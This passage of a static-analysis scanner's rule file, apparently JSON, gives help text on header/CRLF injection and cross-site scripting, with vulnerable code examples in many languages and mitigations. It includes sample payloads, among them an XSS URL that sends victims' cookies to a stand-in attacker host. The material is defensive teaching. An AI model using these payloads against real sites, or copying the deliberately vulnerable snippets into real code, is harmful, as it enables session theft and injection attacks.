HTTP response:\n\n\n  Content-Language: en-us\n\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n\n  ?language=en-us\\nHTTP/1.1+200+OK\n\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[PHP]\n\n## Header Injection in PHP\n\nIn PHP, setting HTTP headers is done using the header() function. If untrusted input is used directly to set headers, it may expose the application to header injection vulnerabilities. Consider the following example:\n\nphp\n$language = $_GET['language'] ?? 'en-us';\nheader(\"Content-Language: \" . $language);\n\n// Rest of the page logic\n\n\nThis code takes a language parameter from the query string and sets the Content-Language header accordingly. If a malicious user provides input like:\n\n\n?language=en-us%0D%0AContent-Type:text/html;%20charset=UTF-7\n\n\nThe attacker has now successfully injected an additional header. This can lead to serious consequences, including:\n\n1. **Setting Malicious Cookies**: By injecting a Set-Cookie header, an attacker could overwrite or create cookies.\n  \n2. **Content Sniffing**: A header injection can be used to change the Content-Type header, potentially making the browser interpret the response differently than intended, leading to various attacks.\n\n3. **Bypassing Security Controls**: By injecting headers like Content-Security-Policy, an attacker can modify or disable security policies.\n\n## Mitigation\n\n1. **Avoid Direct Inclusion**: Never directly include user-supplied data when setting headers.\n\n2. **Validate and Sanitize**: Before setting headers, validate and sanitize the input to ensure that it does not contain newline characters or other harmful content.\n\n3. **Use Built-In Functions**: PHP has functions like filter_input which can be used to get and validate input data:\n\nphp\n$language = filter_input(INPUT_GET, 'language', FILTER_SANITIZE_STRING);\nif ($language) {\n    header(\"Content-Language: \" . $language);\n} else {\n    header(\"Content-Language: en-us\");\n}\n\n\nAlways be cautious when dealing with HTTP headers, as manipulating them can have\nunexpected consequences for the security and behavior of your application.\n\n:::\n\n::::\n\n## Mitigation\n\n* Avoid writing untrusted content into HTTP responses headers wherever possible.\n\n* Strip new-line characters from any content written to HTTP headers, or only allow a restricted range of characters.\n\n* Where the HTTP response header is generated from untrusted input, validate the input value against a server-side list\n  of allowed values before generating the header value. In the code example above, the language parameter should be\n  checked against a list of valid language values.\n\n\n## Additional information\n\n**[CWE-113](https://cwe.mitre.org/data/definitions/113.html)**\n\n**[OWASP-A7](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)**.",
                "markdown": "Attacker-controlled data is stored in HTTP headers without escaping. This indicates a CRLF or header injection vulnerability.\n\n# Header Injection\n\n**Header injection** vulnerabilities occur when HTTP response headers are\nconstructed from untrusted input. Besides direct control over the HTTP header in\nquestion, in most cases this can be abused in the form of a **CRLF Injection**\nfor **HTTP Response Splitting** to send additional, malicious HTTP responses to\na victim's browser.\n\n::::tabs\n\n:::tab[Java]\n\n## Header Injection in Java\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```java\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String language = request.getParameter(\"language\");\n    \n    if (language == null) {\n        language = \"en-us\";\n    }\n\n    response.setHeader(\"Content-Language\", language);\n\n    RequestDispatcher dispatcher = request.getRequestDispatcher(\"welcome\");\n    dispatcher.forward(request, response);\n}\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[C#]\n\n## Header Injection in C#\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```csharp\npublic IActionResult Language([FromQuery] string language) \n{\n    if (string.IsNullOrEmpty(language)) \n    {\n        language = \"en-us\";\n    }\n\n    Response.Headers.Add(\"Content-Language\", language);\n    return View();\n}\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[JavaScript]\n\n## Header Injection in JavaScript\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  const language = request.query.language || 'en-us'\n\n  response.header('Content-Language', language)\n  render_welcome_page(request, response)\n})\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Python]\n\n## Header Injection in Python\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```python\n@app.route('/')\ndef home():\n  language = request.args['language'] or 'en-us'\n\n  response = render_welcome_page(language)\n  response.headers = { 'Content-Language' : language }\n  \n  return response\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Scala]\n\n## Header Injection in Scala\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```scala\n  def language = Action { request =>\n    val language = request.getQueryString(\"language\").getOrElse(\"en-us\")\n\n    Redirect(\"/\").withHeaders(\"Content-Language\" -> language)\n  }\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[Go]\n\n## Header Injection in Go\n\nConsider the following code that takes the `language` parameter from the query string of the HTTP request and writes it \nout it to the `Content-Language` header:\n\n```go\nfunc Home(response http.ResponseWriter, request *http.Request) {\n  language := request.URL.Query().Get(\"language\")\n\n  if language == \"\" {\n    language = \"en-us\"\n  }\n\n  response.Header().Add(\"Content-Language\", language)\n\n  if err := templates[\"home\"].Execute(response, nil); err != nil {\n    http.Error(response, err.Error(), http.StatusInternalServerError)\n  }\n}\n```\n\nThis code is intended to take a request with a language in the query string:\n\n```\n  ?language=en-us\n```\n\nAnd write the corresponding header in the HTTP response:\n\n```\n  Content-Language: en-us\n```\n\nHowever, the code does not strip out new-line characters, which means a URL with the following form:\n\n```\n  ?language=en-us\\nHTTP/1.1+200+OK\n```\n\n...can be used to by an attacker to generate two separate HTTP responses, the second of which is under full control\nof an attacker. This is called **HTTP response splitting**, and can be used to launch various types of attack:\n\n* *Cross-site scripting* (XSS) attacks, where malicious JavaScript code is sent to the victim's browser and executed \n  under your web-domain.\n  \n* *Cache-poisoning* attacks, where any downstream caching servers will have malicious content injected into them. This\n  will affect subsequent victims that visit the same poisoned resource within the caching period.\n  \n* *Malware delivery*, whereby the second HTTP response contains a malicious payload, like a PDF file that takes \n  advantage of vulnerabilities in common PDF viewing software.\n\n:::\n\n:::tab[PHP]\n\n## Header Injection in PHP\n\nIn PHP, setting HTTP headers is done using the `header()` function. If untrusted input is used directly to set headers, it may expose the application to header injection vulnerabilities. Consider the following example:\n\n```php\n$language = $_GET['language'] ?? 'en-us';\nheader(\"Content-Language: \" . $language);\n\n// Rest of the page logic\n```\n\nThis code takes a `language` parameter from the query string and sets the `Content-Language` header accordingly. If a malicious user provides input like:\n\n```\n?language=en-us%0D%0AContent-Type:text/html;%20charset=UTF-7\n```\n\nThe attacker has now successfully injected an additional header. This can lead to serious consequences, including:\n\n1. **Setting Malicious Cookies**: By injecting a `Set-Cookie` header, an attacker could overwrite or create cookies.\n  \n2. **Content Sniffing**: A header injection can be used to change the `Content-Type` header, potentially making the browser interpret the response differently than intended, leading to various attacks.\n\n3. **Bypassing Security Controls**: By injecting headers like `Content-Security-Policy`, an attacker can modify or disable security policies.\n\n## Mitigation\n\n1. **Avoid Direct Inclusion**: Never directly include user-supplied data when setting headers.\n\n2. **Validate and Sanitize**: Before setting headers, validate and sanitize the input to ensure that it does not contain newline characters or other harmful content.\n\n3. **Use Built-In Functions**: PHP has functions like `filter_input` which can be used to get and validate input data:\n\n```php\n$language = filter_input(INPUT_GET, 'language', FILTER_SANITIZE_STRING);\nif ($language) {\n    header(\"Content-Language: \" . $language);\n} else {\n    header(\"Content-Language: en-us\");\n}\n```\n\nAlways be cautious when dealing with HTTP headers, as manipulating them can have\nunexpected consequences for the security and behavior of your application.\n\n:::\n\n::::\n\n## Mitigation\n\n* Avoid writing untrusted content into HTTP responses headers wherever possible.\n\n* Strip new-line characters from any content written to HTTP headers, or only allow a restricted range of characters.\n\n* Where the HTTP response header is generated from untrusted input, validate the input value against a server-side list\n  of allowed values before generating the header value. In the code example above, the `language` parameter should be\n  checked against a list of valid language values.\n\n\n## Additional information\n\n**[CWE-113](https://cwe.mitre.org/data/definitions/113.html)**\n\n**[OWASP-A7](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)**."
              },
              "name": "HeaderInjection",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "Attacker-controlled data is stored in HTTP headers without escaping. This indicates a CRLF or header injection vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Header Injection"
              }
            },
            {
              "id": "attacker-to-html",
              "help": {
                "text": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the search query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this <script> tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag <img src=\"...\">. An attacker with user-id 1337 specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\nhtml\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\njavascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(<img src=\"${res.avatarURL}\">));\n\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the Content-Security-Policy (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an <iframe> with the sandbox attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\nhtml\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n\n\nhtml\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache \ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the bypassSecurityTrust* functions in the DomSanitizer object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\ntypescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as &lt;&quot;script&quot;&gt; when rendering the HTML, safely defusing any\npotential XSS attacks:\n\nhtml\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n\n\nThis can be overridden using the Html.Raw() method - opening up the possibility of XSS attacks:\n\nhtml\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n\n\nCarefully audit every use of Html.Raw() to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the System.Web.HttpUtility.HtmlEncode() method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe html/template package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\ngo\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse({{define \"T\"}}Hello, {{.}}!{{end}})\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n\n\n...writes escaped HTML to the out variable. This is in contrast to the text/template package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the html/template.HTMLEscapeString() function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\njavascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the escape-html Node module:\n\njavascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the safe keyword (which tells the template engine you consider the source trustworthy):\n\n\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n\n\nAnother way your templates can become vulnerable is by adding the {% autoescape false %} directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin html module provides the escape() function for this purpose:\n\npython\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\njsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n\n\nTo disable auto-escaping in React, you would use the property dangerouslySetInnerHTML. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\njsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\nhtml\n<p>\n  @(article.content)\n</p>\n\n\nYou can opt out of this protection by using @Html(). Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\nhtml\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the play.api.templates.HtmlFormat.escape() method for this. Other options are the\norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache\ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\nphp\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: <script>alert('XSS!');</script>\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in htmlspecialchars function:\n\nphp\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n\n\nBy using htmlspecialchars, the input string is made safe for displaying in HTML by converting characters like < and > into their respective HTML entities (&lt; and &gt;), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use htmlspecialchars or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against <script> tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html).",
                "markdown": "Attacker-Controlled data is used as HTML content. This indicates a Cross-Site-Scripting (XSS) vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the 